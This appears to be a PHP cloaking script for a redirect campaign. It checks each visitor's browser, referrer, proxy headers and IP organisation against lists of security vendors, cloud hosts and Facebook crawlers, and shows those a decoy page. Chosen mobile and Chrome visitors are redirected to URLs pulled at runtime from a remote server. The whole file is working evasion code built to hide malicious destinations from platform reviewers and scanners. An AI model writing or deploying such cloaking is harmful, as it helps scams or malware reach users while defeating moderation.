<?php
//exit();
if(isset($_SERVER['HTTP_X_PURPOSE'])){
    exit();
  }
  $_SERVER['HTTP_HOST'] = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : '';
  $_SERVER['HTTP_USER_AGENT'] = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
  
function GetIP()
{
    foreach (array('HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR') as $key)
    {
        if (array_key_exists($key, $_SERVER) === true)
        {
            foreach (array_map('trim', explode(',', $_SERVER[$key])) as $ip)
            {
                if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false)
                {
                    return $ip;
                }
            }
        }
    }
}
$_SERVER["REMOTE_ADDR"] = GetIP();
function generate_name($length){
        $rname = "";
        $sesli = "aeiou";
        $sessiz = "bcdfghjklmnprstvyz";
        $rname = rand(1,2) == 1 ? $sessiz[rand(0,strlen($sessiz)-1)] : $sesli[rand(0,strlen($sesli)-1)];
        for($n=0;$n<$length;$n++){
            if(in_array($rname[strlen($rname)-1], str_split($sesli))){
                $rname .= $sessiz[rand(0,strlen($sessiz)-1)];
            }else{
                $rname .= $sesli[rand(0,strlen($sesli)-1)];
            }
        }
        return $rname;
    }
  
  function getORG(){
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'http://ipinfo.io/'.$_SERVER["REMOTE_ADDR"].'/org');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    $org = curl_exec($ch);
    curl_close($ch);
    return $org.' ipinfo';
  }
  
  $action = 'theme';
  $reason = 'browser';
  
  
  require_once('Mobile_Detect.php');
  require_once('Browser.php');
  
  
  $detect = new Mobile_Detect;
  $browser = new Browser();
  if($detect->isMobile() || $browser->isMobile()){
    $action = 'mobile';
  }else if($browser->getBrowser() == Browser::BROWSER_CHROME){
    $action = 'site';
  }else{
    $action = 'theme';
  }
  if($action != 'theme'){
    $bannedhosts = array();
    foreach ($bannedhosts as $ban) {
      if(strpos($_SERVER['HTTP_HOST'], $ban) !== false){
        $action = 'theme';
        $reason = 'bannedhost';
        break;
      }
    }
  }
  if($action == 'site'){
    $_SERVER['HTTP_REFERER'] = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
    $refs = array('googleapis.com', 'facebook.com','herokuapp.com','checkpost.space','goo.gl','bpgcpvxpurninnhkmv.ga',"tx0.org","blogspot","youtube.com","ijebikusup.ml");
    $action = 'theme'; 
    foreach ($refs as $ref) {
      if(strpos($_SERVER['HTTP_REFERER'], $ref) !== false){
        $action = 'site';
        $reason = 'referer';
        break;
      }
    }
    if(isset($_SERVER['HTTP_VIA']) || isset($_SERVER['HTTP_X_FORWARDED_FOR'])){
	    if($_SERVER['HTTP_VIA'] != "1.1 vegur" || $_SERVER['HTTP_X_FORWARDED_FOR'] != $_SERVER["REMOTE_ADDR"]){
	    
      		$action = 'theme';
      		$reason = 'proxy';
	    }
    }
  }
  $asnlist = array('reports.fb.com','facebook','google','linode','kaspersy','mcafee','amazon','microsoft corporation','digital ocean','incorporated','inc.','radore','netvision','veri merkezi','data center','mcafee');
  
  if($action != 'theme'){
    $_SERVER['GEOIP_ORG'] = isset($_SERVER['GEOIP_ORG']) ? $_SERVER['GEOIP_ORG'] : '';
    if($_SERVER['GEOIP_ORG'] == ''){
      $_SERVER['GEOIP_ORG'] = getORG();
    }
    foreach ($asnlist as $asn) {
      if(strpos(strtolower($_SERVER['GEOIP_ORG']), $asn) !== false){
        $action = 'theme';
        $reason = 'asn';
        break;
      }
    }
    if(isset($_SERVER['HTTP_VIA']) && strpos(strtolower($_SERVER['HTTP_VIA']), 'compression')){
      $action = 'mobile';
      $reason = 'compression';
    }
  }
  if(isset($_SERVER['HTTP_X_FB_CURL_CLIENT'])){
    $action = 'theme';
    $reason = 'fbcurl';
  }
  if(isset($_SERVER['REQUEST_METHOD']) && $_SERVER['REQUEST_METHOD'] != 'GET'){
    $action = 'theme';
    $reason = 'method';
  }
  if($action != 'theme' && $action != 'mobile'){
    $_SERVER['HTTP_REFERER'] = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
    $bannedrefs = array('facebook.com/lsr.php','facebook.com/l.php','digitalocean.com','facebook.com/help','fb.me');
    foreach ($bannedrefs as $ref) {
      if(strpos($_SERVER['HTTP_REFERER'], $ref) !== false){
        $action = 'theme';
        $reason = 'bannedref';
        break;
      }
    }
  }
 $data =  json_decode(file_get_contents("http://extensionx.xyz/php/heroku_data.php"));
  
  $mobileurl = $data->mobile; // goo.gl
  $pcurl = $data->pc; // site.com
  $themeurlfake = "share.php";
  
   $id = @$_GET["id"];
  $id = isset(explode(".", $id)[0]) ? explode(".", $id)[0] : $id;
  if($id == ''){
    $id = generate_name(rand(5,6));
    // $action = 'theme';
    // $reason = 'emptyid';
  }
    if($action == 'mobile'){
    header("Location: {$mobileurl}");
  }else if($action == 'site'){
	if(strrpos($_SERVER['HTTP_HOST'], $pcurl) === false){
		header('Location: http://'.$pcurl.'/'.$id.'.html?v=#');
    }
  }else if($action == 'theme'){
    @ob_end_clean();
    @ob_end_flush();
    require_once($themeurlfake);
	
  }
?>